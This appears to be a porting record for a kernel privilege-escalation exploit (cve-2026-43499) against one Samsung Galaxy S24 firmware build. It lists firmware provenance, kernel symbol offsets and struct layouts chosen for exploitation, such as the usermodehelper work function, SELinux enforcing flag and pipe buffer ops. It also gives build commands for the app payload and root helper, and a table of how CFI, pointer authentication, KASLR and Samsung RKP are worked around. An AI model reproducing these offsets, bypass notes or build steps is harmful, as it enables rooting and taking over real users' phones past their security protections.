# Galaxy S24 SM-S921B / S921BXXUHEZIF port record

This record contains the exact inputs and derived values for the hardware-
untested Galaxy S24 profile `e1s-S921BXXUHEZIF`. The kernel is a new 6.1.162
Android 17 build (`CP2A.260605.016`), not a descendant of the earlier S921B
6.1.157 images, so every symbol and layout below was re-derived from this
build's own boot Image, `System.map` and BTF. The runtime slide geometry is the
only part that is inherited from a device-validated sibling, and it is marked
as such.

## Firmware identity and acquisition

Samsung FUS was queried with `samloader-rs` for model `SM-S921B`, region `EUX`.
The returned four-part version was:

```text
S921BXXUHEZIF/S921BOXMHEZIF/S921BXXUHEZIF/S921BXXUHEZIF
```

The encrypted source object and extracted archives were:

```text
SM-S921B_4_20260920110051_mhgqcf3ybe_fac.zip.enc4
SM-S921B_4_20260920110051_mhgqcf3ybe_fac.zip
AP_S921BXXUHEZIF_..._meta_OS17.tar.md5
BL_S921BXXUHEZIF_...tar.md5
CP_S921BXXUHEZIF_CP36479536_...tar.md5
HOME_CSC_OXM_S921BOXMHEZIF_...tar.md5
CSC_OXM_S921BOXMHEZIF_...tar.md5
```

The decrypted archive is 18,603,188,503 bytes with SHA-256
`0150F11AE2C00AAD1FD47ECBC4DBE393A267576E2B0ED9BE3F6A0B01D6D7DF92`. The
download log records the exact version string above and the `.enc4` download
name. The device-reported properties are:

```text
model: SM-S921B
device: e1s
display build: CP2A.260605.016.S921BXXUHEZIF
fingerprint: samsung/e1sxeea/e1s:17/CP2A.260605.016/S921BXXUHEZIF:user/release-keys
ABI: arm64-v8a
page size: 4096
kernel release: 6.1.162-android14-11
kernel build: #1 SMP PREEMPT Sat Sep 19 08:06:47 UTC 2026
compiler: clang 17.0.2 (r487747c), +pgo +bolt +lto -mlgo
```

The AP tar name carries `meta_OS17`, matching the `:17` release field of the
build fingerprint; this is the Android 17 branch, not a 16 QPR.

## Extracted image hashes

```text
boot.img.lz4 size: 22430554
boot.img.lz4 SHA-256: 38ED474B56F7AFAA833E843F565DA7F7665BFCD6215D55A2DE75A7EA7845C64B
boot.img size: 67108864
boot.img SHA-256: 5E8DD754D2FB52DA2CE197AB8B274984EC53E87051F9FD7B1C5AE49D3A5EE316
kernel size: 38832640
kernel SHA-256: CA8E9199CCFB7D12561A18FFDF38346C681DA44DA7EE1B722D0EE5F611F94F91
vmlinux.full.elf SHA-256: 3D399362B30B4C538DB93E91043D1FEBB2308C044D4CB2A92F35291C814026F8
vmlinux.btf size: 5998391
vmlinux.btf SHA-256: 44CA3275033330189C54DED13CEBFF2B6EC9A517156D42DA70C9D0F67426DCC0
System.map size: 4782901
System.map SHA-256: 5EF69E5119CCD5DBBC042EEE5E0748D648E4DC4211BDCDCAD1789A28215463D9
vendor_boot.img SHA-256: 920711224262B6A64B268DDE1E5635DF3346A125718764504CC1AD0A9A1B0E4C
sboot.bin size: 9016112
sboot.bin SHA-256: 4D1A6358D42B8284A54926D818F4361B0E94E29ED248320108BC02FC23C6002E
vbmeta.img SHA-256: 8E75AD660F813794E6EC1968B2E2D23BE0D934EB843EAA72B69F0DFA3BF2CE27
dtbo.img SHA-256: 5FB82C465A055C9027B259B9973DBC6AAD56C2C0591D28455792834812308519
init_boot.img SHA-256: C7A7FD983A3ABE7AE48CD7A97F8B083FF63FE4D17C598F86D14A07F87F73D19E
recovery.img SHA-256: 160F0ABB7851680B8C300CA25C026DC90CEDFE532984600E2EFF40A5E35A6C5F
```

The AP and BL tar members were removed after verification; their recorded
sizes and hashes come from the extraction pass and are kept in the workspace
notes. The HEZIF `sboot.bin` is a
different blob from the DZE1/DZDR/ZF2 one (`5C4CA4C0...`), which
matters for the physical-load derivation below.

## ARM64 Image header

The raw `boot/kernel` is a flat arm64 Image with the PE/EFI stub prefix:

```text
0x00  code0          executable branch stub ("MZ" bytes)
0x08  text_offset    0x00000000
0x10  image_size     0x00000000027c0000
0x18  flags          0x000000000000000a
0x38  magic          0x644d5241 ("ARMd")
0x3c  res5           0x00000040 (PE COFF header offset)
0x44  COFF machine   0xaa64 (IMAGE_FILE_MACHINE_ARM64)
```

`text_offset == 0` and `image_size` equals `_end - _text` from the recovered
symbol map (`0xffffffc00a7c0000 - 0xffffffc008000000`), so the Image file is a
byte-for-byte map of the kernel image starting at `_text`. The flags value
`0x0a` decodes as little-endian, 4 KiB pages, and physical placement allowed at
any 2 MiB-aligned base.

## Symbol and BTF recovery

`vmlinux-to-elf` reconstructed 115,739 symbols at image base
`0xffffffc008000000`; this matches the 115,739 entries in this build's
`System.map`, and the addresses below differ from the earlier S921B builds
because the two Images are different firmwares. Raw
BTF was located at kernel file interval `[0x188f4e8, 0x1e47c1f)` (5,998,391
bytes); its little-endian header starts with `9f eb 01 00 18 00 00 00`, and
`tools/carve_btf.py` validated the header and string table before extraction.
The merged ELF (`vmlinux.elf` plus an appended `.BTF` section) is what
`tools/verify_target_profile.py` reads.

The commands that produced those artifacts, and the checks that accepted the
profile, are below. `IMG` is the scratch directory holding the extracted image;
firmware and extracted images never enter the repository, as `.gitignore`
enforces.

```sh
IMG=../boot           # kernel, boot.img, the six .lz4 members: repository-excluded inputs

tools/carve_btf.py "$IMG/kernel" -o "$IMG/vmlinux.btf"
vmlinux-to-elf "$IMG/kernel" "$IMG/vmlinux.elf"
llvm-objcopy --add-section .BTF="$IMG/vmlinux.btf" "$IMG/vmlinux.elf" "$IMG/vmlinux.full.elf"
extract-ikconfig "$IMG/kernel" > "$IMG/config.txt"

tools/extract_offsets.py --vmlinux "$IMG/vmlinux.full.elf" --format btf \
  --map "$IMG/System.map" --symbols --header offsets.h    # 77/77 struct offsets

tools/verify_target_profile.py e1s-S921BXXUHEZIF \
  "$IMG/vmlinux.full.elf" "$IMG/System.map" "$IMG/kernel"  # 67/67 checks passed
```

`carve_btf.py`, `extract_offsets.py` and `sboot_disasm.py` are vendored under
`tools/` in this repository, so the whole stage is reproducible from the tree.
`--map` writes `System.map`; the symbol stage needs `pyelftools` and the tool
exits 2 rather than dropping symbol addresses silently. See
[`PORTING.md`](PORTING.md) section 3 for the full stage contract.

Required offsets from the recovered HEZIF ELF are:

| Macro/use | Symbol or derivation | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x000d4584` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | instruction after the blocking `worker_thread -> schedule` call | `0x000dbeb8` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x003a1db0` |
| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` | `0x003efdbc` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x00471bd4` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x00472104` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x00d3ce78` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x00d3d7b0` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x00d3d808` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x00d3da34` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x00d3dabc` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00d3dbdc` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x0121ead0` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x013db448` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `"nfnetlink_log"` string referenced by qword zero of `nfulnl_logger` | `0x016dfad0` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x017aaa98` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x022eac58` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` object | `0x022f2808` |
| `INIT_TASK_OFF` | `init_task` | `0x022ff600` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `random_table + 0x100 + offsetof(struct ctl_table, data)` | `0x0243ef60` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_miscs + offsetof(miscdevice, fops)` | `0x02484d80` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02515cc0` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x025ea4a8` |
| `SLIDE_SYSCTL_BOOTID_OFF` | actual `sysctl_bootid` UUID storage | `0x026d1ba0` |

`ashmem_miscs` has a System.map symbol here (`0xffffffc00a484d70`), so the
`ASHMEM_MISC_FOPS_OFF` value is no longer a blind qword scan: adding
`offsetof(struct miscdevice, fops) == 0x10` yields `0x02484d80` exactly.

The target BTF confirms the same exploit-relevant layouts as the existing 6.1
profiles: `struct file_operations` is `0x110`, `struct page` / `struct slab`
is `0x40`, `struct miscdevice.fops` is `0x10`, `struct pipe_buffer` is `0x28`
(`ops` at `0x10`), `struct pipe_inode_info` is `0xb8` (`bufs` at `0xa8`),
`struct task_struct` is `0x12c0`, `struct work_struct` is `0x30`, and
`struct subprocess_info` is `0x70` with `work.func` at `0x18`. The
`rt_mutex_waiter` is the compact layout, size `0x58`: `pi_tree_entry 0x18`,
`task 0x30`, `lock 0x38`, `wake_state 0x40`, `prio 0x44`, `deadline 0x48`,
`ww_ctx 0x50`. The profile therefore sets `COMPACT_RT_MUTEX_WAITER 1`; the
legacy `0x70` fake layout from the pre-HEZIF HEAD profile is stale for this
kernel.

Two raw qword checks in the Image confirm the nfulnl and boot_id anchors:

```text
qword at _text + 0x022f2808 == 0xffffffc0096dfad0  (name pointer of nfulnl_logger)
qword at _text + 0x0243ef60 == 0xffffffc00a6d1ba0  (random_table boot_id data slot)
```

`SLIDE_NFULNL_LOGGER_NAME_OFF` and `SLIDE_NFULNL_LOGGER_OBJECT_OFF` deliberately
name different addresses: the former is the string pointer read from qword zero
of the latter. Likewise, `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` is the
writable sysctl table pointer slot temporarily redirected by the oracle,
whereas `SLIDE_SYSCTL_BOOTID_OFF` is the UUID storage restored into that slot.
`random_table` is at `0xffffffc00a43ee58`, and the boot_id entry is index 4
(`+0x100`), whose `.data` member sits at `+0x8`.

Runtime trace event ID `106` was derived as `__TRACE_LAST_TYPE (20) +` the
zero-based `sched_blocked_reason` registration index: `__event_sched_blocked_reason`
is `0xffffffc00a2aabf0`, `__start_ftrace_events` is `0xffffffc00a2aa940`, the
difference `0x2b0` is 86 qwords.

`SLIDE_PSELECT_WORD_SHIFT` is `3` in this profile. This supersedes the
static-analysis narrative in the DZE1 record, which concluded that the waiter
starts at word zero; on hardware the shift-zero value faulted in
`_raw_spin_trylock+0x1c` on attempt 6, and the corrected value `3` is what the
device-validated DZDR, ZF3 and (since commit `388c870`) DZE1 profiles ship.
HEZIF has the same compact waiter geometry and inherits `3`; the value itself
has not been read back on HEZIF hardware.

## kmalloc cache rows

The pipe reclaim gate indexes `kmalloc_caches[type][index]`. The HEZIF BTF
defines:

```text
enum kmalloc_cache_type {
    KMALLOC_NORMAL  = 0,
    KMALLOC_DMA     = 0,   /* CONFIG_ZONE_DMA is not set */
    KMALLOC_CGROUP  = 1,
    KMALLOC_RECLAIM = 2,
    NR_KMALLOC_TYPES = 3,
};
```

System.map places `kmalloc_caches` at `0xffffffc0097aaa98` and the next symbol
(`size_index`) at `0xffffffc0097aabe8`, an interval of `0x150` = 3 rows of 14
qwords. The shared `common.h` defaults (type 2, four cache types) would read
the RECLAIM row and one row past the array, which fails the
`pipe_reclaim_cache_gate`. The profile therefore sets:

```c
#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3
```

This is the same override the hardware-validated S921N SFDZF3 profile and the
S24+ DZDR profile use. It is derived from this build's own BTF and symbol
bounds, not copied.

## Physical load proof

The raw ARM64 Image has `text_offset == 0`, so the physical entry point equals
the physical load address. DZE1, DZDR and DZF2 prove
`P0_KERNEL_PHYS_LOAD = 0x80000000` from their own `sboot.bin`: the code
branching to `Starting kernel...` loads the Image text offset, adds
`0x80000000`, and branches to it.

HEZIF ships a different `sboot.bin` (`4D1A6358...`, 9,016,112 bytes) and that
direct proof has not been reproduced. The string `Starting kernel` is at file
offset `0x39b258`, but the full disassembly contains no `adrp`/`add` pair
referencing its page (`0x39b000`, immediate `0x258`); `ARMd` occurs zero times
in the blob, and the handoff is reached through a data table and indirect
dispatcher rather than a literal branch. An earlier reading of a
`mov w9, #-0x80000000` sequence near `0x6b0d00` was a byte-order misparse: that
region is an alternating `0xc0`/`0x80` data table with a dispatcher at
`0x6b0d88`, not the kernel handoff. A DTB-magic scan of `sboot.bin`,
`dtbo.img`, `vendor_boot.img`, `recovery.img`, `init_boot.img` and `vbmeta.img`
returned no hits, so the DRAM base cannot be cross-checked from a shipped DTB
either. This was confirmed a second way: `magiskboot unpack` of
`vendor_boot.img.lz4` yields exactly one DTB (434,020 bytes), whose
`/chosen/bootargs` matches the string quoted under *Mitigations* and whose
`linux,initrd-start` / `linux,initrd-end` properties carry no value, and which
contains no `memory@` node at all — the Samsung bootloader installs the memory
node at runtime, so no shipped image of this build states the DRAM base.

The profile therefore keeps the inherited value and records it as unverified:

```c
/* inherited from the same-model validated profiles; unverified on HEZIF */
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
```

Corroboration is that every SM-S921B/S926B build on this kernel generation
loads at `0x80000000`, and the P0 oracle probes 32 slide candidates starting
from that base. A wrong physical base would fail the fingerprint read on every
candidate rather than corrupt anything, so the first on-device attempt will
either confirm the value or localise the error to this constant.

## Inherited runtime geometry

All symbol-derived constants are re-derived from HEZIF. The runtime geometry
below is the device-tested compact-waiter bundle, taken from
`e1s-S921BXXSFDZE1` (the closest validated sibling) with the kmalloc override
added from this build's own BTF:

| Knob | Value | Basis |
| --- | --- | ---: |
| `COMPACT_RT_MUTEX_WAITER` | `1` | HEZIF BTF waiter size `0x58` |
| `SLIDE_PSELECT_WORD_SHIFT` | `3` | compact-family hardware correction |
| `SKB_DATA_DELTA` | `-0x1000` | compact-family geometry |
| `SLIDE_BANK_SLOTS` | `5` | compact-family geometry |
| `SLIDE_BANK_TASK_OFF` | `0x3200` | compact-family geometry |
| `P0_ORACLE_PRODUCTION_SLOT` | `4` | compact-family geometry |
| `MM_STRUCT_SZ` / `MM_ORDER` | `0x400` / `3` | SLUB stride, see below |
| `APP_FOPS_TABLE_MIRROR_OFF` | `0x1e80` | compact-family geometry |
| `APP_REQUIRE_FRESH_P0_SESSION` | `1` | compact-family geometry |
| `KSNITCH_COLLISIONS` / `_CONFIRMATIONS` | `5` / `3` | compact-family geometry |
| `KMALLOC_CGROUP_TYPE` / `KMALLOC_CACHE_TYPES` | `1` / `3` | HEZIF BTF + symbol bounds |

`MM_STRUCT_SZ` is `0x400` even though BTF reports `sizeof(struct mm_struct) ==
0x3c0`: the KASAN HW-tag redzone rounds the SLUB object stride to `0x400`, and
the DZDR record showed on hardware that both the repository default `0x500` and
a literal `0x3c0` enumerate wrong boundaries. The compact-family value is kept
and listed as pending confirmation for this build.

Because HEZIF and DZE1 are different builds, the geometry values above are
unverified on HEZIF hardware; they are inherited only because the waiter,
pipe, and external-object layouts they depend on are identical (`0x58` waiter,
`0x28` pipe_buffer, `0xb8` pipe_inode_info), and the compact family is the only
bundle that has ever completed the chain on a real device.

## Constant deltas against the DZE1 profile

A macro-by-macro audit against `e1s-S921BXXSFDZE1/target.h` compares 176
macros: 153 identical, 21 per-build symbol addresses that differ, and two
kmalloc overrides that exist only on the HEZIF side. No knob drifted.

| Macro | DZE1 | HEZIF |
| --- | ---: | ---: |
| `ANON_PIPE_BUF_OPS_OFF` | `0x0121dd10` | `0x0121ead0` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `0x00d39634` | `0x00d3d7b0` |
| `ASHMEM_FOPS_OFF` | `0x013d9ec8` | `0x013db448` |
| `ASHMEM_IOCTL_OFF` | `0x00d38cfc` | `0x00d3ce78` |
| `ASHMEM_MISC_FOPS_OFF` | `0x02484bb0` | `0x02484d80` |
| `ASHMEM_MMAP_OFF` | `0x00d3968c` | `0x00d3d808` |
| `ASHMEM_OPEN_OFF` | `0x00d398b8` | `0x00d3da34` |
| `ASHMEM_RELEASE_OFF` | `0x00d39940` | `0x00d3dabc` |
| `ASHMEM_SHOW_FDINFO_OFF` | `0x00d39a60` | `0x00d3dbdc` |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `0x000d4468` | `0x000d4584` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `0x00471274` | `0x00472104` |
| `CONFIGFS_READ_ITER_OFF` | `0x00470d44` | `0x00471bd4` |
| `COPY_SPLICE_READ_OFF` | `0x003ef02c` | `0x003efdbc` |
| `INIT_TASK_OFF` | `0x022ff800` | `0x022ff600` |
| `KMALLOC_CACHES_OFF` | `0x017a8098` | `0x017aaa98` |
| `KMALLOC_CACHE_TYPES` | absent (default) | `3` |
| `KMALLOC_CGROUP_TYPE` | absent (default) | `1` |
| `NOOP_LLSEEK_OFF` | `0x003a1414` | `0x003a1db0` |
| `SELINUX_ENFORCING_OFF` | `0x025ea478` | `0x025ea4a8` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `0x016dd6a0` | `0x016dfad0` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `0x022f2a08` | `0x022f2808` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `0x0243ef78` | `0x0243ef60` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `0x026d1b60` | `0x026d1ba0` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | `0x000dbd9c` | `0x000dbeb8` |
| `SYSTEM_UNBOUND_WQ_OFF` | `0x022eae58` | `0x022eac58` |

The two `KMALLOC_*` rows are new overrides rather than numeric deltas; DZE1's
kernel has a different `kmalloc_cache_type` enumeration and is not affected.

## P0 table and payload build

`src/targets/e1s-S921BXXUHEZIF/p0_fingerprint.h` was generated from this raw
Image for all 32 candidates `0x000000` through `0x1f0000`
(`tools/generate_p0_fingerprint.pl ../boot/kernel 0x1f0000 <output>`). The
generator verified 32 rows and 256 source qwords at page offsets `0x000, 0x200,
..., 0xe00`; regenerating into a scratch header and diffing against the
committed table produces no change, so the table is byte-identical to the
shipped kernel.

`tools/verify_target_profile.py e1s-S921BXXUHEZIF ../boot/vmlinux.full.elf
../boot/System.map ../boot/kernel` reports `67/67 checks passed`, including all
32 P0 fingerprint rows through slide `0x1f0000`.

The app-domain release payload is built with:

```sh
make TARGET=e1s-S921BXXUHEZIF \
  ANDROID_NDK_HOME=/path/to/android-ndk release
```

On macOS, point `TARGET_CC` at the darwin prebuilt clang and shim `stat -c %s`
for the release size gate. The fixed-size result is published at
`artifacts/e1s-S921BXXUHEZIF/cve-2026-43499-app.so`: 104,128 bytes, SHA-256
`FD8D72F406E03980E05EAFD4B90C15212B624A87AAF88371680240E3E89B7FFE`.

The root helper that the payload's usermode-helper path executes is published
beside it as `artifacts/e1s-S921BXXUHEZIF/cve-2026-43499-root`: 27,072 bytes,
SHA-256 `54894E9BFA80FC36CFA03BD4EC4279E1D56ECCC9719C9EE395B64FFD6792866B`.
It needs no porting work at all: `src/su_daemon.c` includes no target header and
references no offset macro, and the `$(ROOT_HELPER)` rule in the Makefile has no
`$(TARGET_HEADER)` prerequisite, so the same source compiles to the same
executable for every target on a given NDK. Both files are pushed to
`/data/local/tmp/` and made executable before the device phase.

## KernelSU compatibility

HEZIF reports vermagic `6.1.162-android14-11 SMP preempt mod_unload modversions
aarch64`. The Samsung-patched KernelSU builds published for the 6.1.157 e1s
kernels do not match that string and cannot be loaded here because
`CONFIG_MODULE_FORCE_LOAD=n`. A module built for this exact release now exists;
the build record is below.

The pre-existing e1s KernelSU `.ko` was audited against the HEZIF symbol table
with `kernelsu/tools/audit_module_against_target.py ... --manual-relocation`,
because the shipped module has an empty `__versions` section and cannot be
CRC-matched. `kernelsu/tools/extract_target_symvers.py` produced 15,469 CRCs
from the HEZIF image; the audit reports 202 undefined imports, zero missing from
the target symbol table, 47 imports resolved only through kallsyms (present in
the target but outside its export table, which the Samsung module loader
accepts), zero target CRC mismatches, and exit status 0. It does not import
`stop_machine`, so the no-patch-text path stays available.

A dedicated build for `6.1.162-android14-11` is required before KernelSU is
announced for this firmware, and it has been run. The source is KernelSU
`v3.2.5` — upstream commit
`b0bc817b4e966aa6aa830834eaf6ef765d821d40`, which is exactly what the tag
`v3.2.5` resolves to — plus
`patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch`, which passes
`git apply --check` against that tag without fuzz, so the source provenance of
the existing e1s DZE1 module is reproducible.

No per-build struct offsets need re-deriving for this component. The patch
introduces no target-specific offsets — its only size constants are
`sizeof(*work)` and `sizeof(uid_t)` — because every Samsung-specific routine is
resolved by name at module init through
`ksu_resolve_symbol_for_functable_hook()`. All six names it resolves are
present in the HEZIF symbol table:

| resolved name | HEZIF address |
| --- | --- |
| `get_task_creds` | `ffffffc008704f08` |
| `set_task_creds` | `ffffffc008705094` |
| `prepare_ro_creds` | `ffffffc008d9d378` |
| `kdp_assign_pgd` | `ffffffc008d9d804` |
| `inc_rlimit_ucounts` | `ffffffc0080ea2ec` |
| `dec_rlimit_ucounts` | `ffffffc0080ea37c` |

The recipe in `kernelsu/README.md` applies unchanged; the only
target-specific edit is rewriting the DDK's generated release string from
`6.1.166-dirty` to `6.1.162-android14-11` in
`$KDIR/include/generated/utsrelease.h` and
`$KDIR/include/config/kernel.release`, which is what `CONFIG_MODULE_FORCE_LOAD=n`
demands. The build was executed as:

```sh
rsync -a --exclude .git KernelSU/ buildsrc/   # no .git on purpose, see below
docker run --rm -v "$PWD/buildsrc:/workspace" -v "$PWD/boot:/target:ro" \
  -w /workspace/kernel ghcr.io/ylarod/ddk-min:android14-6.1-20260313 bash -lc '
    sed -i "s/6.1.166-dirty/6.1.162-android14-11/g" \
      "$KDIR/include/generated/utsrelease.h" \
      "$KDIR/include/config/kernel.release"
    CONFIG_KSU=m \
    CONFIG_KSU_SAMSUNG_KDP=y CONFIG_KSU_SAMSUNG_RKP=y \
    CONFIG_KSU_SAMSUNG_DEFEX=y CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y \
    CC=clang make -j"$(nproc)"
    ./check_symbol ./kernelsu.ko /target/vmlinux.full.elf
  '
llvm-strip -d kernelsu.ko
```

The tree is copied without `.git` deliberately. Kbuild computes
`KSU_VERSION = 30000 + git commit count` when a repository is present and
otherwise uses the fallback `32525`, which is the version code the published
Samsung modules report to KernelSU Manager. The build emitted the expected
`KSU_GIT_VERSION not defined` warning plus
`-- KernelSU fallback version: 32525`, and finished with exit status 0 and no
other diagnostics:

```text
vermagic: 6.1.162-android14-11 SMP preempt mod_unload modversions aarch64
kernel/check_symbol kernelsu.ko <HEZIF vmlinux.full.elf>  -> exit 0

kernelsu/android14-6.1_kernelsu-e1s-S921BXXUHEZIF-kdp.ko
size: 398336
SHA-256: 13FD97A8D303C63C8A3DF5D70AD93F8FD311AEC927A1DCDEF1C3C004D492FD2F
```

`llvm-strip -d` removes debug sections only: `.symtab`, `.strtab` and `.BTF` are
retained for the manual loader and `__versions` is empty. The
manual-relocation audit of this module against the HEZIF `vmlinux.full.elf` and
the 15,469 CRCs extracted from the same image reports 202 undefined imports,
zero missing from the target symbol table, 47 imports available only through
kallsyms, zero module version entries, zero target CRC mismatches, no
`stop_machine` import, and exit status 0 — the same contract the device-tested
e1s DZE1 module satisfies. `ksu_samsung_kdp_init`, `ksu_samsung_kdp_put_cred`,
`ksu_samsung_defex_sync_current` and `defex_enforce_kprobe` are present in the
module symbol table, confirming the no-patch-text configuration.

The paired `ksud-e1s-S921BXXUHEZIF-kdp` is intentionally not published yet.
Late-load can only run after this payload has already produced a root shell, so
the `ksud` pair is cut once the module load is confirmed on HEZIF hardware.
Module load on this firmware is untested, and KernelSU is not announced for this
build.

## Mitigations

| config | value | consequence for the port |
| --- | --- | --- |
| `CONFIG_CFI_CLANG` | y | hijacked `pipe_buf_operations.release` / `work.func` must keep exact prototypes |
| `CONFIG_ARM64_PTR_AUTH` + `_KERNEL` | y | PAC on returns; data-only path required |
| `CONFIG_SHADOW_CALL_STACK` | y | `ret` additionally guarded by x18 |
| `CONFIG_KASAN` + `KASAN_HW_TAGS` + `CONFIG_ARM64_MTE` | y | kernel heap tagging active; no `kasan=off` on the cmdline |
| `CONFIG_KFENCE` | y | 63 objects, sampling interval 500; nondeterminism |
| `CONFIG_INIT_ON_ALLOC_DEFAULT_ON` | y | sprayed objects must be written explicitly |
| `CONFIG_SLAB_FREELIST_HARDENED` / `_RANDOM` | y | no blind freelist overwrite |
| `CONFIG_DEBUG_LIST` | y | corrupted wait-list links panic when walked |
| `CONFIG_SLUB_DEBUG` | y | compiled in; not force-enabled by cmdline |
| `CONFIG_HARDENED_USERCOPY` / `VMAP_STACK` | y | standard |
| `CONFIG_RANDOMIZE_BASE` | y | KASLR slide required |
| `CONFIG_RKP` / `CONFIG_KNOX_NCM` | y | cred patching is the wrong endgame; RKP inspectors live |
| `CONFIG_STATIC_USERMODEHELPER` | y, path `""` | `modprobe_path` overwrite is dead; the root route hand-builds `subprocess_info` and queues `work.func = call_usermodehelper_exec_work` |
| `CONFIG_SECURITY_SELINUX` + `_DEVELOP` | y | `selinux_state.enforcing` is writable data |
| `CONFIG_SECURITY_SAFESETID` | y | no arbitrary uid transitions |
| `CONFIG_KALLSYMS_ALL` | y | all symbols present; `/proc/kallsyms` denied to `shell` |
| `CONFIG_MODULES` | y, 406 modules | module memory available |

The shipped cmdline (recovered from the same build's vendor_boot DTB,
`/chosen/bootargs`) contains no `kasan=off`, no `nokaslr` and no `slub_debug=`,
so HW-tag KASAN, KASLR and the compiled-in SLUB debug code all apply. The full
bootargs string is recorded in the Phase 1 results file of the port workspace.

## Cleanup and validation state

The 38,832,640-byte raw kernel, `vmlinux.elf`, `vmlinux.full.elf`,
`vmlinux.btf`, `System.map` and `config.txt` are retained locally for retries
and for the profile verifier, together with the six `.lz4` partition members
streamed out of the AP tar (`boot`, `vendor_boot`, `init_boot`, `dtbo`,
`recovery`, `vbmeta`) and the unpacked 67,108,864-byte `boot.img`. The AP and BL
tar members themselves were streamed and never materialised on disk.

Two artifacts live outside the repository, in the port workspace, so that no
firmware is committed: the extracted-image directory and the 18,603,188,503-byte
decrypted firmware archive `SM-S921B_4_20260920110051_mhgqcf3ybe_fac.zip`. The
hashes above are the provenance record; the archive is kept only so that the
other partition members can be re-hashed without re-downloading 18.6 GB.

A clean rebuild from the committed profile reproduces the published artifact
byte for byte: `rm -rf build/e1s-S921BXXUHEZIF && make TARGET=e1s-S921BXXUHEZIF
ANDROID_NDK_HOME=<ndk-r29> release` re-links the payload under the size gate,
`truncate -s 104128`, and yields SHA-256 `FD8D72F4...B7FFE` for both the
in-build `.release.so` and `artifacts/e1s-S921BXXUHEZIF/cve-2026-43499-app.so`.

No on-device run has been performed for this build. The exploit has not been
executed, the inherited physical-load and geometry constants are unverified,
and `support/targets-v3.json` has no HEZIF entry yet. Add it only after the
hardware pass reports `done=1 root=1`; the target entry should carry
`models: ["SM-S921B"]`, `kernelVersions: ["6.1.162"]`, artifact size `104128`
and `requiresFreshP0Session: true`. Root is RAM-only: a reboot removes it, and
force-stopping the app after the exploit can panic the device by releasing
retained kernel pages.
